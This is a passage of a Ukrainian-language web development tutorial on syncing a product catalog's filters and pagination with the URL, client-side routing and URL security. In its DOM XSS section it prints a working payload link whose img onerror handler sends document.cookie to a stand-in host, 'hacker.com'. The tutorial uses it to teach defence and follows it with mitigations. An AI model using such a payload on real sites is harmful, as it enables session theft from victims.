        console.warn("History API обмежено для протоколу file://, використовуйте локальний сервер.");
      }

      urlPreview.textContent = `Поточний URL: ${newRelativeUrl}`;
    }

    // 5. Головний конвеєр обробки даних та рендерингу (State -> Data Pipeline -> UI)
    function applyCatalogPipeline() {
      const normalizedQuery = catalogState.q.toLowerCase();

      // Етап А: Фільтрація за категорією та пошуковим рядком
      const filtered = PRODUCTS.filter(product => {
        const matchesCategory = catalogState.category === "all" || product.category === catalogState.category;
        const matchesSearch = product.title.toLowerCase().includes(normalizedQuery);
        return matchesCategory && matchesSearch;
      });

      // Етап Б: Сортування (створюємо копію масиву, щоб не мутувати оригінал)
      const sorted = [...filtered].sort((a, b) => {
        if (catalogState.sort === "price_asc") return a.price - b.price;
        if (catalogState.sort === "price_desc") return b.price - a.price;
        if (catalogState.sort === "title_asc") return a.title.localeCompare(b.title, "uk");
        return a.id - b.id; // за замовчуванням
      });

      // Етап В: Пагінація
      const totalItems = sorted.length;
      const totalPages = Math.max(1, Math.ceil(totalItems / ITEMS_PER_PAGE));

      // Якщо номер сторінки перевищує доступну кількість сторінок — коригуємо його
      if (catalogState.page > totalPages) {
        catalogState.page = totalPages;
      }

      const startIndex = (catalogState.page - 1) * ITEMS_PER_PAGE;
      const pageItems = sorted.slice(startIndex, startIndex + ITEMS_PER_PAGE);

      // Етап Г: Рендеринг карток та кнопок пагінації
      resultsCounter.textContent = `Знайдено товарів: ${totalItems} (Сторінка ${catalogState.page} із ${totalPages})`;

      if (pageItems.length === 0) {
        catalogGrid.innerHTML = `<p>За вашим запитом товарів не знайдено.</p>`;
      } else {
        catalogGrid.innerHTML = pageItems.map(item => `
          <article class="card">
            <div class="card-category">${item.category}</div>
            <h3>${item.title}</h3>
            <div class="card-price">${item.price} грн</div>
          </article>
        `).join("");
      }

      renderPaginationControls(totalPages);
    }

    // 6. Генерація кнопок посторінкової навігації
    function renderPaginationControls(totalPages) {
      if (totalPages <= 1) {
        paginationContainer.innerHTML = "";
        return;
      }

      let buttonsHtml = `
        <button class="page-btn" data-page="${catalogState.page - 1}" ${catalogState.page === 1 ? "disabled" : ""}>
          ← Попередня
        </button>
      `;

      for (let p = 1; p <= totalPages; p++) {
        const activeClass = p === catalogState.page ? "active" : "";
        buttonsHtml += `<button class="page-btn ${activeClass}" data-page="${p}">${p}</button>`;
      }

      buttonsHtml += `
        <button class="page-btn" data-page="${catalogState.page + 1}" ${catalogState.page === totalPages ? "disabled" : ""}>
          Наступна →
        </button>
      `;

      paginationContainer.innerHTML = buttonsHtml;
    }

    // 7. Обробники подій елементів керування
    searchInput.addEventListener("input", (event) => {
      catalogState.q = event.target.value.trim();
      catalogState.page = 1; // Скидаємо на першу сторінку при зміні пошуку!
      writeStateToUrl(true); // replaceState, щоб не засмічувати історію кожною літерою
      applyCatalogPipeline();
    });

    categorySelect.addEventListener("change", (event) => {
      catalogState.category = event.target.value;
      catalogState.page = 1;
      writeStateToUrl(false); // pushState — новий крок в історії
      applyCatalogPipeline();
    });

    sortSelect.addEventListener("change", (event) => {
      catalogState.sort = event.target.value;
      catalogState.page = 1;
      writeStateToUrl(false);
      applyCatalogPipeline();
    });

    resetFiltersBtn.addEventListener("click", () => {
      catalogState.q = "";
      catalogState.category = "all";
      catalogState.sort = "default";
      catalogState.page = 1;

      searchInput.value = "";
      categorySelect.value = "all";
      sortSelect.value = "default";

      writeStateToUrl(false);
      applyCatalogPipeline();
    });

    // Делегування кліків по кнопках пагінації
    paginationContainer.addEventListener("click", (event) => {
      const btn = event.target.closest(".page-btn");
      if (!btn || btn.disabled) return;

      catalogState.page = Number(btn.dataset.page);
      writeStateToUrl(false); // pushState — перехід на нову сторінку записується в історію
      applyCatalogPipeline();
    });

    // 8. Слухач кнопок браузера "Назад" та "Вперед"
    window.addEventListener("popstate", () => {
      readStateFromUrl();
      applyCatalogPipeline();
      urlPreview.textContent = `Поточний URL: ${window.location.pathname}${window.location.search}`;
    });

    // Ініціалізація при першому завантаженні сторінки
    readStateFromUrl();
    writeStateToUrl(true);
    applyCatalogPipeline();
  </script>
</body>
</html>
```

---

## 7. Основи клієнтської маршрутизації (Client-Side Routing)

Окрім фільтрації та пагінації в межах однієї вітрини, сучасні веб-додатки часто мають кілька логічних екранів (Views): «Каталог», «Сторінка деталей товару», «Оформлення замовлення», «Про нас». Механізм, який відстежує зміну URL і підміняє видимий екран без перезавантаження документа, називається **клієнтським маршрутизатором (Client-Side Router)**.

Існує дві базові стратегії побудови клієнтських роутерів:

### 7.1. Маршрутизація на основі хешу (Hash-based Routing)

У цьому підході маршрут записується після символу решітки `#`, наприклад:
- `https://techshop.ua/#/catalog` - головна вітрина;
- `https://techshop.ua/#/product/42` - картка товару з ID 42;
- `https://techshop.ua/#/checkout` - екран оформлення замовлення.

Для відстеження переходів використовується подія `window.addEventListener('hashchange', ...)`:

```javascript
function handleHashRoute() {
  // Отримуємо рядок після "#", за замовчуванням — "#/catalog"
  const hash = window.location.hash || "#/catalog";

  if (hash === "#/catalog") {
    showCatalogSection();
  } else if (hash.startsWith("#/product/")) {
    const productId = Number(hash.replace("#/product/", ""));
    showProductDetailSection(productId);
  } else if (hash === "#/checkout") {
    showCheckoutSection();
  }
}

window.addEventListener("hashchange", handleHashRoute);
window.addEventListener("DOMContentLoaded", handleHashRoute);
```

Переваги та недоліки Hash-роутингу:
- головна перевага - працює **без жодного налаштування веб-сервера** (і навіть при відкритті локального файлу за протоколом `file://` або на простому статичному хостингу GitHub Pages), оскільки браузер ніколи не відправляє частину після `#` на сервер і завжди завантажує `index.html`;
- недоліки - менш естетичний вигляд адрес із символом `#`, складніше поєднувати зі стандартними якірними посиланнями всередині сторінки та гірша індексація старими пошуковими роботами.

### 7.2. Маршрутизація на основі History API (Pathname Routing)

У цьому підході використовуються чисті, людиночитабельні шляхи (`https://techshop.ua/product/42`), а переходи між сторінками перехоплюються через делегування кліків по посиланнях `<a href="/product/42" data-link>` із викликом `history.pushState()`.

> [!WARNING]
> **Проблема прямого входу та помилки 404 у History-роутингу:** Поки користувач ходить по сайту через `history.pushState('/product/42')`, усе працює на клієнті без звернення до сервера. Але як тільки користувач натисне **F5** на адресі `https://techshop.ua/product/42`, браузер надішле реальний HTTP-запит на сервер і попросить фізичний файл `/product/42/index.html`. Якщо сервер не налаштований на режим **SPA Fallback** (перенаправлення всіх невідомих маршрутів на головний `index.html`), користувач отримає помилку `404 Not Found`! Тому для статичних хостингів без конфігурації роутингу (наприклад, базовий GitHub Pages) надійніше використовувати query-параметри (`?view=product&id=42`) або Hash-роутинг.

---

## 8. Безпека та типові помилки при роботі з URL

### 8.1. Вразливість DOM-based XSS через параметри URL

Найнебезпечніша помилка при роботі з `URLSearchParams` — сліпа довіра даним, зчитаним із адресного рядка. Пам'ятайте: **URL є зовнішнім вхідним потоком даних, який повністю контролюється зловмисником!** Зловмисник може сконструювати спеціальне посилання зі шкідливим JavaScript-кодом у параметрі `?q=` і надіслати його жертві у месенджері.

Подивіться на вразливий код:

```javascript
// КРИТИЧНА ВРАЗЛИВІСТЬ DOM XSS:
const params = new URLSearchParams(window.location.search);
const query = params.get("q");

// Якщо зловмисник надішле посилання:
// https://techshop.ua/?q=<img src=x onerror="fetch('https://hacker.com/?cookie='+document.cookie)">
// то вставка через innerHTML негайно виконає шкідливий скрипт у браузері жертви!
document.getElementById("searchTitle").innerHTML = `Результати за запитом: ${query}`;
```

Правила безпечної роботи з параметрами URL:
- для виведення пошукових запитів або параметрів у текст сторінки завжди використовуйте **`element.textContent`** замість `innerHTML`;
- суворо валідуйте параметри за списком дозволених значень (Allowlist) - наприклад, якщо параметр `sort` приймає лише `price_asc`, `price_desc` або `title_asc`, будь-яке інше значення з URL має автоматично скидатися на `'default'`;
- числові параметри (`page`, `id`, `minPrice`) завжди пропускайте через `Number()` або `parseInt()` із перевіркою на `NaN` та обмеженням діапазону (`Math.max`, `Math.min`).

### 8.2. Обмеження політики Same-Origin для History API

Методи `history.pushState()` та `history.replaceState()` дозволяють змінювати лише шлях (`pathname`), параметри запиту (`search`) та хеш (`hash`) **у межах поточного джерела (`origin`)**.

Якщо скрипт на сайті `https://techshop.ua` спробує виконати:

```javascript
// Спроба підмінити домен в адресному рядку на інший сайт (фішинг-захист):
history.pushState(null, "", "https://privatbank.ua/login");
// Браузер негайно викине виняток SecurityError!
```

Це фундаментальний механізм безпеки браузера, який унеможливлює фішингові атаки з підміною адреси банку чи іншого сервісу в адресному рядку.

---

## Висновки

- розподіл відповідальності за збереження стану - локальні налаштування та приватні дані (кошик, обрана тема, чернетки) зберігаються у `Web Storage`, тоді як параметри відображення каталогу (пошуковий запит, категорія, сортування, номер сторінки пагінації) мають зберігатися в адресному рядку URL для підтримки закладок і спільного доступу за посиланням;
- стандартні інструменти парсингу - об'єкт `new URL()` та інтерфейс `URLSearchParams` звільняють розробника від ручного склеювання рядків та автоматично забезпечують коректне процентне кодування спецсимволів і кирилиці;
- керування історією без перезавантаження - методи `history.pushState()` та `history.replaceState()` дозволяють змінювати URL в адресному рядку в межах поточного домену, зберігаючи швидкодію односторінкового додатку (SPA);
- розмежування `pushState` та `replaceState` - дискретні переходи (зміна сторінки пагінації чи категорії) записуються через `pushState`, а потокове введення тексту в поле пошуку — через `replaceState`, щоб не засмічувати стек історії браузера;
- двостороння синхронізація та подія `popstate` - повноцінний інтерфейс має як записувати зміни фільтрів у URL, так і відновлювати свій стан із URL при першому завантаженні сторінки та при натисканні кнопок «Назад / Вперед» (подія `popstate`).

## Джерела

- [MDN Web Docs: URL API](https://developer.mozilla.org/en-US/docs/Web/API/URL)
- [MDN Web Docs: URLSearchParams](https://developer.mozilla.org/en-US/docs/Web/API/URLSearchParams)
- [MDN Web Docs: History API](https://developer.mozilla.org/en-US/docs/Web/API/History_API)
- [MDN Web Docs: Window popstate event](https://developer.mozilla.org/en-US/docs/Web/API/Window/popstate_event)
- [WHATWG URL Standard](https://url.spec.whatwg.org/)

## Запитання для самоперевірки

- Чому стан фільтрів каталогу, сортування та поточної сторінки пагінації доцільно зберігати в URL, а не в `localStorage`?
- Із яких основних частин складається URL і яка частина адреси (`search` чи `hash`) ніколи не передається на сервер під час HTTP-запиту?
- У чому полягає різниця між методами `set()` та `append()` інтерфейсу `URLSearchParams`, а також між методами читання `get()` та `getAll()`?
- Чому при зміні властивості `window.location.search` відбувається повне перезавантаження сторінки, а при виклику `history.pushState()` — ні?
- За яким принципом обирають між `history.pushState()` та `history.replaceState()` під час реалізації живого пошуку та посторінкової пагінації?
- У який момент спрацьовує подія `window.onpopstate` і чому вона не викликається автоматично під час виконання `history.pushState()`?
- Чому в конвеєрі обробки каталогу операція нарізки сторінки (`.slice()`) завжди має виконуватися після фільтрації та сортування, і навіщо скидати номер сторінки на `1` при зміні фільтра?
- Яка загроза безпеки виникає при виведенні значення параметра з `URLSearchParams` на сторінку через `innerHTML` і як від неї захиститися?
